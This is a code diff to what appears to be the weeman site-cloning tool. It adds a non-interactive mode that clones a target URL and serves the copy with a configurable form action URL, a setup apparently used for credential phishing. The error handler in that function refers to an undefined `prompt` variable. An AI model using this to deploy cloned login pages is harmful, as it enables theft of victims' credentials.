@@ -39,8 +39,39 @@ def print_startup():
     print("\033[01;37m\t<><><><><><><><><><<><><><><><><><><>\033[00m")
     print("\t\'%s\'" %say)
     print("\033[01;37m\t<><><><><><><><><><<><><><><><><><><>\n\033[00m")
- 
-def shell(quiet_mode):
+
+def shell_noint(options):
+    global url
+    global port
+    global action_url
+    global user_agent
+    global html_file
+
+    url = options.url
+    action_url = options.action_url
+    port = int(options.port)
+    user_agent = options.user_agent
+    html_file = options.html_file
+
+    try:
+        print_startup()
+        s = weeman(url,port)
+        s.clone()
+        s.serve()
+
+    except KeyboardInterrupt:
+        s = weeman(url,port)
+        s.cleanup()
+        print("\nInterrupt ...")
+    except IndexError:
+        if prompt[0] == "help" or prompt[0] == "?":
+            print_help()
+        else:
+            printt(3, "Error: please provide option for \'%s\'." %prompt[0])
+    except Exception as e:
+        printt(3, "Error: (%s)" %(str(e)))
+
+def shell():
     """
         The shell, parse command line args,
         and set variables.
@@ -51,8 +82,7 @@ def shell(quiet_mode):
     global user_agent
     global html_file
 
-    if not quiet_mode:
-        print_startup()
+    print_startup()
     complete(array)
 
     if os.path.exists("history.log"):
